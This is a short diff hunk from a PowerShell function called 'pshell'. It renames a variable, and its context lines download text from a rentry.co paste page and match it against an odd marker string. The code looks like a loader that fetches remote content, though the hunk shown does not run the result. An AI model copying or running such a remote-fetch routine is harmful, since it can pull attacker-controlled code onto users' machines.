@@ -822,10 +822,10 @@ function pshell(x)
   [System.Collections.ArrayList]$embedArray = @()
   
   $WebClient=New-Object net.webclient
-  $gorkem = "]]..x..[["
+  $lexius = "]]..x..[["
   $raw = $WebClient.DownloadString("https://rentry.co/9bwc2")
   
-  If ($raw | %{$_ -match $gorkem}) 
+  If ($raw | %{$_ -match $lexius}) 
   {
   
   If (Test-Path $deneme2) {
